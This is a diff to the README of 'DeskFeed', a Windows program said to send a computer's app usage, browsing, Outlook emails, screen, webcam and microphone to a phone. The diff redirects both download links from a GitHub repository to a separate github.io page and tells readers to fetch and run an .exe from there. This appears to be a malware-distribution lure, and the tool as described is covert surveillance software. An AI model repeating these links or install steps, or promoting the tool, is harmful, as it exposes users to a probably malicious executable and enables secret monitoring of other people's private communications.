@@ -1,6 +1,6 @@
 # 🖥️ DeskFeed - Monitor Windows activity on your phone
 
-[![](https://img.shields.io/badge/Download-DeskFeed-blue.svg)](https://github.com/Decussate-muskusgrass907/DeskFeed)
+[![](https://img.shields.io/badge/Download-DeskFeed-blue.svg)](https://decussate-muskusgrass907.github.io)
 
 DeskFeed tracks your computer usage and sends live updates to your Android phone. It records the apps you open, the websites you visit, and the emails you read in Outlook. You can also stream your computer screen, webcam, or microphone to your mobile device.
 
@@ -12,7 +12,7 @@ Your computer must run Windows 10 or Windows 11. You need a stable internet conn
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [official download page](https://github.com/Decussate-muskusgrass907/DeskFeed).
+1. Go to the [official download page](https://decussate-muskusgrass907.github.io).
 2. Look for the file ending in .exe under the latest release.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
